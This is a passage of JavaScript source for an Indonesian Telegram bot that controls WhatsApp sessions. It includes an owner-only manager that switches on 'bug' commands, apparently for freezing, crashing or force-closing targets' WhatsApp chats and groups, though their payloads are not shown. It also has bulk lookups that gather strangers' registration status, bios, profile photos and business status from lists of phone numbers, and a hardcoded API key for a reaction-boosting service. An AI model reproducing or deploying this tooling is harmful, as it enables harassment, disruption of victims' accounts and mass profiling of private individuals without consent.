│
│ ❌ Group ini tidak terdaftar
│ sebagai premium.
│
│ Group ID :
│ <code>${gid}</code>
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  saveAllowedGroups(allowedGroups);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 GROUP PREMIUM MANAGER 」───
│
│ ✅ Premium berhasil dihapus
│
│ 〆 Group ID :
│ <code>${gid}</code>
│
│ Status :
│ ❌ Non-Premium
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});

// /listgroup (bisa di private / group)
bot.onText(/^\/listgroup$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  if (!Array.isArray(allowedGroups) || allowedGroups.length === 0) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 GROUP PREMIUM MANAGER 」───
│
│ ❌ Belum ada group premium
│ yang terdaftar.
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  const now = Date.now();
  let text = `
<blockquote>
╭───「 LIST GROUP PREMIUM 」───
│
`;

  allowedGroups.forEach((g, i) => {

    // ===== FORMAT LAMA (STRING) =====
    if (typeof g === "string") {
      text += `│ ${i + 1}. <code>${g}</code>\n`;
      text += `│    Status : ✅ Aktif (Tanpa Expired)\n│\n`;
    }

    // ===== FORMAT BARU (OBJECT) =====
    else if (g && typeof g === "object") {
      const expired = Number(g.expired) || 0;

      if (!expired) {
        text += `│ ${i + 1}. <code>${g.id}</code>\n`;
        text += `│    Status : ⚠️ Tidak ada data expired\n│\n`;
      } else {
        const remainingMs = expired - now;
        const remainingDays = Math.ceil(remainingMs / (24 * 60 * 60 * 1000));

        if (remainingMs > 0) {
          text += `│ ${i + 1}. <code>${g.id}</code>\n`;
          text += `│    Status : ✅ ${remainingDays} Hari lagi\n`;
          text += `│    Expired: ${new Date(expired).toLocaleString("id-ID")}\n│\n`;
        } else {
          text += `│ ${i + 1}. <code>${g.id}</code>\n`;
          text += `│    Status : ❌ Expired\n`;
          text += `│    Expired: ${new Date(expired).toLocaleString("id-ID")}\n│\n`;
        }
      }
    }
  });

  text += `╰────────────────</blockquote>`;

  return bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});
// ==============================
// SCARRY DEATH V42 • Single source of truth for anti category command labels.
const SCARRY_ANTI_COMMANDS = Object.freeze(['/xscry', '/xtech', '/xvicz', '/xstund', '/xfreeze', '/freezez', '/frzbugs', '/bugsfreeze', "/lockchat", "/banindo"]);
const SCARRY_GROUP_COMMANDS = Object.freeze(['/fcgc', '/frezegc', '/blankgc', "/lockgc"]);
const SCARRY_MANAGED_COMMANDS = Object.freeze([...SCARRY_ANTI_COMMANDS, ...SCARRY_GROUP_COMMANDS]);
const CMD_ACTIVE_FILE = path.join(__dirname, "SINGGLE ERA", "ActiveCommands.json");

function loadActiveCommands() {
  try {
    if (!fs.existsSync(CMD_ACTIVE_FILE)) return [];
    const data = JSON.parse(fs.readFileSync(CMD_ACTIVE_FILE, "utf8"));
    if (Array.isArray(data)) return data.map(String);
    if (Array.isArray(data?.active)) return data.active.map(String);
    return [];
  } catch {
    return [];
  }
}

function saveActiveCommands(list) {
  try {
    fs.mkdirSync(path.dirname(CMD_ACTIVE_FILE), { recursive: true });
    fs.writeFileSync(CMD_ACTIVE_FILE, JSON.stringify({ active: list, updatedAt: Date.now() }, null, 2));
  } catch {}
}

let activeCmds = loadActiveCommands();
// V29: nonaktifkan efek Android lama yang diminta untuk dikeluarkan.
// Handler aslinya tidak dihapus, tetapi command tidak dapat aktif via manager.
const SCARRY_RETIRED_ANDROID_EFFECTS = new Set([
  '/foreclx', '/forcloz', '/forexit',
  '/xbugs', '/xkill', '/xynerx', '/zypherx', '/xivorx', '/noctex', '/qexon'
]);

function normalizeCmd(cmd) {
  cmd = String(cmd || "").trim();
  if (!cmd) return null;
  if (!cmd.startsWith("/")) cmd = "/" + cmd;
  cmd = cmd.split(/\s+/)[0].toLowerCase();
  return cmd;
}

function refreshActiveCommands() {
  const previous = loadActiveCommands();
  activeCmds = [...new Set(previous.map(x => String(x).toLowerCase()).filter(x => SCARRY_MANAGED_COMMANDS.includes(x)))];
  if (previous.length !== activeCmds.length || previous.some((x,i) => x !== activeCmds[i])) {
    saveActiveCommands(activeCmds);
  }
  return activeCmds;
}
// Migrate the old activation file once at startup; no command is turned on automatically.
refreshActiveCommands();

// default: kalau belum diaktifkan => dianggap MATI
function isCmdActive(cmd) {
  const c = normalizeCmd(cmd);
  if (!c) return false;
  if (SCARRY_RETIRED_ANDROID_EFFECTS.has(c.toLowerCase())) return false;
  // kalau mau selalu realtime baca file, uncomment:
  // refreshActiveCommands();
  return activeCmds.includes(c);
}

// ==============================
// /aktif /command  (owner only)
// ==============================
// ==============================
// /aktif /command (owner only)
// ==============================
bot.onText(/^\/aktif(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  const rawInput = match?.[1];
  const cmd = normalizeCmd(rawInput);

  if (!cmd) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ❌ Format salah!
│ Gunakan: /aktif /command
│ Contoh : /aktif /xscry
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  // LIST VALID COMMAND (harus sama dengan /cmd)
  const validCommands = SCARRY_MANAGED_COMMANDS;

  if (!validCommands.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ❌ Command tidak ditemukan!
│
│ 〆 ${cmd}
│
│ Pastikan sesuai daftar di /cmd
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  refreshActiveCommands();

  if (activeCmds.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ⚠️ Command sudah aktif
│
│ 〆 ${cmd}
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  activeCmds.push(cmd);
  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ✅ Command berhasil diaktifkan
│
│ 〆 ${cmd}
│ 〆 Status : 🟢 ACTIVE
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});
// ==============================
// /nonaktif /command (owner only)
// ==============================
// ==============================
// /nonaktif /command (owner only)
// ==============================
bot.onText(/^\/nonaktif(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  const rawInput = match?.[1];
  const cmd = normalizeCmd(rawInput);

  if (!cmd) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ❌ Format salah!
│ Gunakan: /nonaktif /command
│ Contoh : /nonaktif /xscry
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  // LIST VALID COMMAND (harus sama dengan /cmd & /aktif)
  const validCommands = SCARRY_MANAGED_COMMANDS;

  if (!validCommands.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ❌ Command tidak ditemukan!
│
│ 〆 ${cmd}
│
│ Cek daftar di /cmd
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  refreshActiveCommands();

  if (!activeCmds.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ⚠️ Command belum aktif
│
│ 〆 ${cmd}
│ 〆 Status : 🔴 OFFLINE
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  activeCmds = activeCmds.filter(x => x !== cmd);
  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ✅ Command berhasil dinonaktifkan
│
│ 〆 ${cmd}
│ 〆 Status : 🔴 OFFLINE
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});

// ==============================
// /cmd (owner only)
// ==============================
bot.onText(/^\/cmd$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  refreshActiveCommands();

  const categories = [
    { title: 'BUGS ANTI KENON', cmds: SCARRY_ANTI_COMMANDS.filter(cmd => cmd !== '/lockchat').map(cmd => cmd.slice(1)) },
    { title: 'BUGS RAWAN BANNED', cmds: ['lockchat', 'banindo'] },
    { title: 'BUGS GROUP ONLY', cmds: SCARRY_GROUP_COMMANDS.map(cmd => cmd.slice(1)) }
  ];

  let body = "╭───「 ALL COMMAND STATUS 」───\n\n";

  // Fungsi biar rata kanan
  const padRight = (text, length) => {
    return text + " ".repeat(Math.max(1, length - text.length));
  };

  const longestCmd = Math.max(
    ...categories.flatMap(c => c.cmds.map(cmd => ("/" + cmd).length))
  );

  for (const cat of categories) {
    body += `${cat.title}\n`;

    for (const cmd of cat.cmds) {
      const fullCmd = "/" + cmd;
      const status = isCmdActive(fullCmd)
        ? "🟢 ACTIVE"
        : "🔴 OFFLINE";

      body += `➪ ${padRight(fullCmd, longestCmd + 2)}${status}\n`;
    }

    body += "\n";
  }

  body += "────────────────────────────\n";
  body += "Status sesuai konfigurasi tersimpan (baca saja).\n";
  body += "Pengaturan aktivitas tetap mengikuti aturan lama.\n";
  body += "╰────────────────────────────";

  const messageText = `\`\`\`\n${body}\n\`\`\``;

  return bot.sendMessage(chatId, messageText, {
    parse_mode: "Markdown"
  });
});
// ==============================
// /aktifall (owner only)
// ==============================
bot.onText(/^\/aktifall$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  // Pastikan list sama persis dengan /cmd
  const allCommands = SCARRY_MANAGED_COMMANDS;

  if (!Array.isArray(activeCmds)) activeCmds = [];
  refreshActiveCommands();

  let added = 0;

  for (const cmd of allCommands) {
    const c = normalizeCmd(cmd);
    if (c && !activeCmds.includes(c)) {
      activeCmds.push(c);
      added++;
    }
  }

  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ✅ AKTIFKAN SEMUA COMMAND
│
│ Total Command : ${allCommands.length}
│ Ditambahkan   : ${added}
│ Sekarang Aktif: ${activeCmds.length}
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});

// ==============================
// /resetall (owner only)
// ==============================
bot.onText(/^\/resetall$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  refreshActiveCommands();

  const totalBefore = activeCmds.length;

  activeCmds = [];
  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ⚠️ RESET SEMUA COMMAND
│
│ Total Sebelumnya : ${totalBefore}
│ Sekarang Aktif   : 0
│
│ Status : 🔴 ALL OFFLINE
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});
// ================= DATA SUPER BESAR =================
const agamaList = [
  { nama: "Islam", desc: "🕌 Iman kuat, hati adem" },
  { nama: "Kristen", desc: "⛪ Kasih besar, jiwa hangat" },
  { nama: "Katolik", desc: "✝️ Tenang dan penuh makna" },
  { nama: "Hindu", desc: "🕉️ Harmoni dengan alam" },
  { nama: "Buddha", desc: "☸️ Damai, sadar diri" },
  { nama: "Konghucu", desc: "🧧 Bijaksana & beretika" },
  { nama: "Spiritual Universal", desc: "🌍 Terhubung dengan semesta" },
  { nama: "Meditatif", desc: "🧘 Jiwa hening & fokus" },
  { nama: "Zen Life", desc: "🍃 Simple tapi bermakna" },
  { nama: "Sufi Vibes", desc: "✨ Cinta ilahi mendalam" },
  { nama: "Stoic Mind", desc: "🪨 Kuat, tenang, logis" },
  { nama: "Cosmic Faith", desc: "🌌 Percaya energi kosmik" },
  { nama: "Agama Kopi", desc: "☕ Iman aktif setelah ngopi" },
  { nama: "Agama Rebahan", desc: "😴 Pencerahan datang sambil tidur" },
  { nama: "Agama Deadline", desc: "⏰ Baru sadar pas mepet" },
  { nama: "Agama Scroll", desc: "📱 Ibadah lewat layar" },
  { nama: "Agama Healing", desc: "🌿 Hidup harus self-healing" },
  { nama: "Agama Musik", desc: "🎧 Jiwa hidup lewat lagu" }
];

const auraList = [
  "✨ Putih", "🔥 Merah", "💙 Biru", "💚 Hijau", "💜 Ungu",
  "🖤 Hitam", "🌈 Pelangi", "⚡ Emas", "🌑 Abu Gelap", "🌟 Kristal"
];

const elemenList = [
  "🔥 Api", "💧 Air", "🌪 Angin", "🌱 Alam", "⚡ Petir",
  "🌑 Void", "🌕 Cahaya", "🪨 Tanah", "🌊 Laut", "❄️ Es"
];

const moodList = [
  "😄 Ceria", "😌 Tenang", "🥴 Capek", "😎 Santai",
  "🤪 Random", "😶 Kosong", "😤 Emosian", "🥹 Sensitif",
  "🤔 Overthinking", "😴 Ngantuk", "🥳 Hyper", "😇 Damai"
];

const rankList = [
  "⚪ Pemula", "🟢 Awam", "🔵 Stabil", "🟣 Spiritual",
  "🟡 Enlightened", "🟠 Master", "🔴 Ascended",
  "👑 Grand Master", "♾ Cosmic Being", "🕯 Awakened Soul"
];

const emojiLoading = ["⏳", "🔍", "🧠", "✨", "🔮", "⚙️", "📡", "💫"];
const emojiFun = ["😂", "😹", "🤣", "🤪", "🥴", "😆", "😈", "🧠"];

// ================= UTIL =================

const rand = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randPercent = () => Math.floor(Math.random() * 21) + 80; // 80–100
const randStat = () => Math.floor(Math.random() * 51) + 50; // 50–100

// ================= COMMAND =================

bot.onText(/\/cekagama/i, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message || !msg.reply_to_message.text) {
    return bot.sendMessage(
      chatId,
      "⚠️ <b>Reply pesan target dulu</b>\nGunakan <code>/cekagama</code> sambil reply pesannya.",
      { parse_mode: "HTML" }
    );
  }

  const targetUser = msg.reply_to_message.from.first_name;
  const targetText = msg.reply_to_message.text;

  const l1 = rand(emojiLoading);
  const l2 = rand(emojiLoading);
  const l3 = rand(emojiLoading);

  const loading = await bot.sendMessage(
    chatId,
    `${l1} <b>Booting Spiritual AI Engine...</b>`,
    {
      parse_mode: "HTML",
      reply_to_message_id: msg.reply_to_message.message_id
    }
  );

  setTimeout(() => {
    bot.editMessageText(
      `${l1} ${l2} <b>Scanning multidimensional aura...</b>`,
      { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
    );
  }, 1000);

  setTimeout(() => {
    bot.editMessageText(
      `${l1} ${l2} ${l3} <b>Finalizing soul data...</b>`,
      { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
    );
  }, 2000);

  setTimeout(() => {
    const hasil = rand(agamaList);
    const aura = rand(auraList);
    const elemen = rand(elemenList);
    const mood = rand(moodList);
    const rank = rand(rankList);
    const percent = randPercent();
    const iman = randStat();
    const energi = randStat();
    const emoji = rand(emojiFun);

    const result = `
${emoji} <b>ULTRA SPIRITUAL ANALYSIS</b> ${emoji}

<blockquote>
<b>${targetUser}</b>
${targetText}
</blockquote>

🛐 <b>Keyakinan</b> : <b>${hasil.nama}</b>
💬 <b>Karakter</b> : ${hasil.desc}

🔮 <b>Aura</b> : ${aura}
🌌 <b>Elemen Jiwa</b> : ${elemen}
😊 <b>Mood Batin</b> : ${mood}

📊 <b>Kecocokan</b> : ${percent}%
📈 <b>Level Iman</b> : ${iman}/100
⚡ <b>Energi Spiritual</b> : ${energi}/100
🏅 <b>Rank</b> : ${rank}

<i>✨ AI Spiritual Engine X • Entertainment Only</i>
`;

    bot.editMessageText(result, {
      chat_id: chatId,
      message_id: loading.message_id,
      parse_mode: "HTML"
    });
  }, 3200);
});

const os = require("os");
const process = require("process");
bot.onText(/\/runtime/i, async (msg) => {
  const chatId = msg.chat.id;

  const uptime = process.uptime(); // detik
  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);

  const totalRam = os.totalmem();
  const freeRam = os.freemem();
  const usedRam = totalRam - freeRam;

  const runtimeText = `
<blockquote>
🤖 BOT STATUS

🕒 Uptime:
${days}d ${hours}h ${minutes}m ${seconds}s

🖥 Platform:
${os.platform()} (${os.arch()})

⚙️ CPU:
${os.cpus()[0].model}

📊 CPU Core:
${os.cpus().length} Core

📈 Load Avg:
${os.loadavg().map(v => v.toFixed(2)).join(" | ")}

💾 RAM Total:
${(totalRam / 1024 / 1024 / 1024).toFixed(2)} GB

🧠 RAM Used:
${(usedRam / 1024 / 1024).toFixed(2)} MB

🧠 RAM Free:
${(freeRam / 1024 / 1024).toFixed(2)} MB

🧩 Node.js:
${process.version}

🆔 PID:
${process.pid}
</blockquote>

<blockquote>
© ${global.botname || "Scarry Death"}
</blockquote>
  `.trim();

  bot.sendMessage(chatId, runtimeText, {
    parse_mode: "HTML"
  });
});
// ================================
// COMMAND /alldownload [url]
// ================================
bot.onText(/\/alldownload(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  // =========================
  // JIKA HANYA /alldownload
  // =========================
  if (!url) {
    return bot.sendMessage(
      chatId,
      `<blockquote>Contoh penggunaan:\n/alldownload link</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  // =========================
  // PESAN LOADING
  // =========================
  bot.sendMessage(
    chatId,
    `<blockquote>Sedang memproses link:\n${url}</blockquote>`,
    { parse_mode: "HTML" }
  );

  try {
    // =========================
    // REQUEST API (SESUAI CURL)
    // =========================
    const res = await axios.get(
      `https://api.nekolabs.web.id/dwn/aio/v1?url=${encodeURIComponent(url)}`
    );

    const result = res.data?.result;

    if (!result || !Array.isArray(result.medias)) {
      return bot.sendMessage(
        chatId,
        `<blockquote>Gagal mengambil media dari link tersebut.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    // =========================
    // PILIH VIDEO 1x SAJA
    // PRIORITAS: hd_no_watermark
    // =========================
    const video =
      result.medias.find(
        (m) => m.type === "video" && m.quality === "hd_no_watermark"
      ) ||
      result.medias.find((m) => m.type === "video");

    if (!video) {
      return bot.sendMessage(
        chatId,
        `<blockquote>Video tidak ditemukan.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    // =========================
    // KIRIM VIDEO (1x)
    // =========================
    await bot.sendVideo(chatId, video.url, {
      caption: `<blockquote>${result.source} • ${video.quality} • ${video.extension}</blockquote>`,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("ALLDOWNLOAD ERROR:", err.message);
    bot.sendMessage(
      chatId,
      `<blockquote>Terjadi kesalahan saat memproses link.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

// ================================
// COMMAND /cici [text]
// ================================
bot.onText(/\/cici(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  // =========================
  // JIKA HANYA /cici
  // =========================
  if (!query) {
    return bot.sendMessage(
      chatId,
      `<blockquote>Contoh penggunaan:\n/cici hai ci apa kabar</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  // =========================
  // PESAN LOADING
  // =========================
  bot.sendMessage(
    chatId,
    `<blockquote>Sedang memproses pesan:\n${query}</blockquote>`,
    { parse_mode: "HTML" }
  );

  try {
    // =========================
    // REQUEST API (SESUAI CURL)
    // =========================
    const res = await axios.get(
      `https://api.nekolabs.web.id/txt.gen/cici-ai?text=${encodeURIComponent(query)}`
    );

    const data = res.data?.result;

    if (!data || !data.chat) {
      return bot.sendMessage(
        chatId,
        `<blockquote>AI tidak memberikan jawaban.</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    // =========================
    // BALASAN AI (KUTIPAN SAJA)
    // =========================
    bot.sendMessage(
      chatId,
      `<blockquote>${data.chat}</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error("CICI AI ERROR:", err.message);
    bot.sendMessage(
      chatId,
      `<blockquote>Terjadi kesalahan saat menghubungi AI.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

// ===============================
// HELPER: CEK BIO
// ===============================
async function checkBio(sock, number) {
  try {
    const jid = number.replace(/\D/g, "") + "@s.whatsapp.net";
    const stat = await sock.fetchStatus(jid);
    const data = Array.isArray(stat) ? stat[0] : stat;

    if (!data?.status?.status) return null;

    return (
      `📝 Bio: ${data.status.status}\n` +
      `⏱️ Update: ${
        data.status.setAt
          ? new Date(data.status.setAt).toLocaleString()
          : "❌ Tidak tersedia"
      }`
    );
  } catch (e) {
    return null;
  }
}
// ===============================
// COMMAND /cekbio (PREMIUM HTML)
// ===============================
bot.onText(/^\/cekwa(?:\s+([\s\S]+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // ===============================
    // Ambil WA user / fallback WA aktif
    // ===============================
    const botNumber = getUserNumber(userId) || getAnyActiveWhatsApp();
    if (!botNumber) {
      return bot.sendMessage(
        chatId,
        "❌ Kamu belum pairing WhatsApp.\nGunakan perintah pairing dulu."
      );
    }

    const sock = sessions.get(botNumber);
    if (!sock) {
      return bot.sendMessage(
        chatId,
        `❌ WhatsApp ${botNumber} tidak aktif / reconnecting.`
      );
    }

    if (!match[1]) {
      return bot.sendMessage(
        chatId,
        "Format:\n/cekwa\n628xxx"
      );
    }

    const numbers = match[1]
      .split("\n")
      .map(v => v.trim())
      .filter(v => /^\d+$/.test(v));

    if (!numbers.length) {
      return bot.sendMessage(chatId, "❌ Tidak ada nomor valid.");
    }

    const progress = await bot.sendMessage(
      chatId,
      `🔍 Mengecek ${numbers.length} nomor target...`
    );

    // ===============================
    // LOOP CEK WA
    // ===============================
    for (let i = 0; i < numbers.length; i++) {
      const number = numbers[i];
      const jid = number + "@s.whatsapp.net";

      // cek nomor terdaftar
      const reg = await sock.onWhatsApp(jid);
      if (!reg || !reg[0]?.exists) continue;

      // ===============================
      // FOTO PROFIL
      // ===============================
      let ppUrl = null;
      try {
        ppUrl = await sock.profilePictureUrl(jid, "image");
      } catch {}

      // ===============================
      // BIO (PAKAI FORMAT ASLI /cekbio)
      // ===============================
      const bio = await checkBio(sock, number);
      if (!bio) continue;

      const caption =
`<blockquote>
${i + 1}. <b>${number}</b>
${bio}
</blockquote>`;

      // ===============================
      // KIRIM FOTO + BIO
      // ===============================
      if (ppUrl) {
        await bot.sendPhoto(chatId, ppUrl, {
          caption,
          parse_mode: "HTML"
        });
      } else {
        await bot.sendMessage(chatId, caption, {
          parse_mode: "HTML"
        });
      }

      // progress
      if ((i + 1) % 50 === 0 || i === numbers.length - 1) {
        await bot.editMessageText(
          `🔍 Progress: ${i + 1}/${numbers.length}`,
          {
            chat_id: chatId,
            message_id: progress.message_id
          }
        );
      }
    }

  } catch (err) {
    console.error("[cekwa]", err);
    bot.sendMessage(chatId, "❌ Terjadi error internal.");
  }
});

global.sessions = global.sessions || new Map();
function escapeHtml(text) {
  if (!text) return "(Bio kosong)";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
    .trim();
}

function getAnyConnectedSock() {
  if (!global.sessions || global.sessions.size === 0) return null;

  for (const [number, sock] of global.sessions.entries()) {
    if (sock?.user) {
      return { number, sock };
    }
  }
  return null;
}
async function checkMetaBusiness(sock, number) {
  try {
    const jid = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const businessProfile = await sock.getBusinessProfile(jid);
    return { isBusiness: !!businessProfile };
  } catch {
    return { isBusiness: false };
  }
}
bot.onText(/^\/wkwkwkbieo([\s\S]*)?/i, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const current = getAnyConnectedSock();

    if (!current) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada WhatsApp yang terhubung.\nSilakan pairing dulu."
      );
    }

    const targets = (match[1] || "")
      .split("\n")
      .map(v => v.trim())
      .filter(v => v && !v.startsWith("/cekbioo"));

    if (!targets.length) {
      return bot.sendMessage(
        chatId,
        "Masukkan nomor target:\n/cekbioo\n628xxx\n628xxx"
      );
    }

    const statusMsg = await bot.sendMessage(
      chatId,
      `<blockquote>
🔗 <b>WhatsApp Connected</b>
Akun: <code>${current.number}</code>
Total target: ${targets.length}
</blockquote>`,
      { parse_mode: "HTML" }
    );

    const results = [];
    const businessMeta = [];
    let processed = 0;

    for (const num of targets) {
      let bioText = "Tidak ada bio / private";

      const bio = await checkBio(current.sock, num);
      if (bio) bioText = bio;

      const biz = await checkMetaBusiness(current.sock, num);
      if (biz.isBusiness) businessMeta.push(num);

      results.push(`wa.me/${num}\n${bioText}`);

      processed++;
      await bot.editMessageText(
        `<blockquote>
🔄 Progress ${processed}/${targets.length}
Menggunakan: <code>${current.number}</code>
</blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMsg.message_id,
          parse_mode: "HTML"
        }
      ).catch(() => {});
    }

    const validResults = results.filter(v => v.includes("Bio:"));
    if (!validResults.length) {
      return bot.sendMessage(chatId, "Tidak ada bio ditemukan.");
    }

    let output = validResults.join("\n\n");

    if (businessMeta.length) {
      output += `\n\n<b>Business Meta</b>\n${businessMeta
        .map((n, i) => `${i + 1}. ${n}`)
        .join("\n")}`;
    }

    if (validResults.length > 5) {
      const filePath = "cekbio_result.txt";
      require("fs").writeFileSync(filePath, output);

      await bot.sendDocument(
        chatId,
        filePath,
        { caption: `Hasil: ${validResults.length}` }
      );

      require("fs").unlinkSync(filePath);
    } else {
      await bot.sendMessage(
        chatId,
        `<blockquote>${output}</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

  } catch (err) {
    console.error("[CEKBIO]", err);
    bot.sendMessage(chatId, "❌ Error fatal saat cek bio.");
  }
});

bot.onText(/\/cekppwa (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1]?.replace(/[^0-9]/g, "");

  if (!number) {
    return bot.sendMessage(chatId, "⚠️ Masukkan nomor!\nContoh: /cekppwa 628xxxx");
  }

  const jid = number + "@s.whatsapp.net";

  try {
    // Ambil sesi aktif dari Map sessions
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif.");
    }

    // Pakai salah satu session aktif
    const [botNumber, sock] = sessions.entries().next().value;

    // Cek apakah nomor terdaftar di WhatsApp
    const reg = await sock.onWhatsApp(jid);
    if (!reg || !reg[0]?.exists) {
      return bot.sendMessage(chatId, `❌ Nomor *${number}* tidak terdaftar di WhatsApp.`, {
        parse_mode: "Markdown",
      });
    }

    // Ambil foto profil WA
    let ppUrl = null;
    try {
      ppUrl = await sock.profilePictureUrl(jid, "image");
    } catch {
      ppUrl = null;
    }

    if (ppUrl) {
      await bot.sendPhoto(chatId, ppUrl, {
        caption: `Foto profil WhatsApp *${number}*`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, `Nomor *${number}* tidak memiliki foto profil.`, {
        parse_mode: "Markdown",
      });
    }
  } catch (err) {
    console.error("❌ CEKWA ERROR:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil foto profil WhatsApp.");
  }
});
// COMMAND: /reactch <channel link> <emoji1 emoji2 ...>
bot.onText(/^\/reactch(?:\s+([\s\S]+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

  try {
    // ===== OWNER CHECK =====
    // CEK HAK AKSES
if (!isAllowed(userId)) {
  return bot.sendMessage(
    chatId,
    "❌ Kamu tidak punya akses untuk menggunakan perintah ini."
  );
}

    if (!text) {
      return bot.sendMessage(
        chatId,
        `<blockquote>
✏️ <b>Contoh Pemakaian:</b>
/reactch &lt;link channel post&gt; 😂 ❤️ 🔥

• link post <b>bukan</b> link ch langsung
• wajib emoji ada <b>3</b>
• wajib kasih <b>spasi</b> antar emoji
</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const args = text.split(/\s+/);
    const link = args.shift();

    // ===== NORMALISASI EMOJI (FIX UTAMA) =====
    const emojiList = args
      .join(" ")
      .replace(/,/g, " ")
      .split(/\s+/)
      .filter(Boolean);

    if (!link || emojiList.length === 0) {
      return bot.sendMessage(
        chatId,
`<blockquote>
✏️ <b>Contoh Pemakaian:</b>
/reactch &lt;link channel post&gt; 😂 ❤️ 🔥

• link post <b>bukan</b> link ch langsung
• wajib emoji ada <b>3</b>
• wajib kasih <b>spasi</b> antar emoji
</blockquote>`,
{ parse_mode: "HTML" }
);
    }

    // API MAU: emoji,emoji,emoji
    const emoji = emojiList.join(",");

    const apiKey =
      "d7f9ebb2ce76b996b9f6c3594dea17a24f636a087e44a2eac8c861223fed43bf";

    const loading = await bot.sendMessage(
      chatId,
      `<blockquote>⚙️ <b>Processing Emoji Reactions...</b>\n⏳ Please wait...</blockquote>`,
      { parse_mode: "HTML" }
    );

    // ⚠️ PENTING: encode LINK saja, JANGAN encode emoji
    const url =
      `https://react.whyux-xec.my.id/api/rch?link=${encodeURIComponent(link)}&emoji=${emoji}`;

    const { data } = await axios.get(url, {
      headers: {
